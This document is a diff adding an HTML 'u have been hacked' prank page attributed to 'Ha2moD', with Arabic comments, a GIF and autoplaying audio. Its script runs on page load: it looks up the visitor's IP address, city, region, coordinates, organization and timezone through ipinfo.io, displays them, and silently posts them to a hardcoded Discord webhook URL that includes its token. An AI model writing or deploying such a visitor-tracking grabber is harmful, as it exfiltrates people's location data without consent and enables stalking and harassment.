@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ha2moD in ur system</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+body {
+    margin:0;
+    padding:0;
+    background:#fff;
+    color:#000;
+    font-family:'Orbitron', sans-serif;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:flex-start;
+    min-height:100vh;
+}
+
+/* شاشة البداية */
+.loading-screen {
+    position:fixed;
+    inset:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#fff;
+    z-index:100;
+}
+.loading-text {
+    font-family:'Orbitron', sans-serif;
+    font-size:3rem;
+    background: linear-gradient(90deg, #000, #00aaff, #000);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientShift 3s infinite linear;
+}
+@keyframes gradientShift {
+    0% {background-position: 0%;}
+    100% {background-position: 200%;}
+}
+
+/* المحتوى */
+.main-content {
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    margin-top:50px;
+    width: 100%;
+}
+.gif-container {
+    width:100%;
+    max-width:600px;
+    text-align:center;
+    margin-top:30px;
+
+}
+
+/* العنوان */
+.sub-title {
+    font-size:2rem;
+    margin-top:15px;
+    text-align:center;
+    background: linear-gradient(90deg, #000, #00aaff, #000);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientShift 3s infinite linear;
+}
+
+/* صندوق المعلومات */
+.info {
+    margin-top:30px;
+    background:#fff;
+    padding:20px;
+    border-radius:15px;
+    border:2px solid #000;
+    width:90%;
+    max-width:600px;
+    font-size:16px;
+    line-height:1.8;
+    color:#000;
+    text-align:center;
+}
+.info h3 {
+    margin-bottom:10px;
+    font-size:1.4rem;
+    background: linear-gradient(90deg, #000, #00aaff, #000);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.info span{display:block;margin:5px 0;}
+
+/* الفوتر */
+.footer {
+    margin-top:25px;
+    font-size:1rem;
+    background: linear-gradient(90deg, #000, #00aaff, #000);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+</style>
+</head>
+<body>
+
+<!-- شاشة البداية -->
+<div class="loading-screen" id="loadingScreen">
+    <div class="loading-text">Ha2moD in ur system</div>
+</div>
+
+<!-- المحتوى -->
+<div class="main-content" id="mainContent" style="display:none;">
+    <div class="gif-container">
+        <img src="https://i.pinimg.com/originals/e0/76/c3/e076c315006ff10bd37381253f022611.gif" alt="GIF">
+    </div>
+
+    <div class="sub-title">u have been hacked by HamoD</div>
+
+    <div class="info" id="ip-info">
+        <h3>معلوماتك عندنا</h3>
+        <span><strong>IP:</strong> loading...</span>
+        <span><strong>City:</strong> loading...</span>
+        <span><strong>Region:</strong> loading...</span>
+        <span><strong>Country:</strong> loading...</span>
+        <span><strong>Location:</strong> loading...</span>
+        <span><strong>Organization:</strong> loading...</span>
+        <span><strong>Timezone:</strong> loading...</span>
+    </div>
+
+    <div class="footer">© Ha2MoD Network</div>
+</div>
+
+<audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1417381090850635917/1420329601573588992/ssstik.io_1758703361068.mp3?ex=6a0b79c5&is=6a0a2845&hm=6c6a34fe22fbf3b2c0e088bc73dd5c26b324e11f3b132b90b65817609eb41452&" type="audio/mpeg">
+</audio>
+
+<script>
+// شاشة البداية
+window.addEventListener('load', function() {
+    setTimeout(()=>{
+        document.getElementById('loadingScreen').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'flex';
+    },2000);
+});
+
+// جلب معلومات IP + إرسال للويب هوك
+fetch('https://ipinfo.io/json')
+.then(res=>res.json())
+.then(data=>{
+    const {ip, city, region, country, loc, org, timezone} = data;
+    const infoDiv = document.getElementById('ip-info');
+    infoDiv.innerHTML = `
+        <h3>  تبي ايكي هاه ؟ </h3>
+        <span><strong>IP:</strong> ${ip}</span>
+        <span><strong>City:</strong> ${city}</span>
+        <span><strong>Region:</strong> ${region}</span>
+        <span><strong>Country:</strong> ${country}</span>
+        <span><strong>Location:</strong> ${loc}</span>
+        <span><strong>Organization:</strong> ${org}</span>
+        <span><strong>Timezone:</strong> ${timezone}</span>`;
+
+    const webhookUrl = "https://discord.com/api/webhooks/1417377585649684560/b523UU-z4dazypJndhUwQ14ejq8xmnCPbC5_lP2s-nK3mRn5Sfd_l-cGuc6xY5xBKR-a";
+    const dateTime = new Date().toLocaleString();
+    fetch(webhookUrl, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({
+            content: `New Visitor:\nIP: ${ip}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nLocation: ${loc}\nOrg: ${org}\nTimezone: ${timezone}\nDateTime: ${dateTime}`
+        })
+    });
+});
+</script>
+
+</body>
+</html>
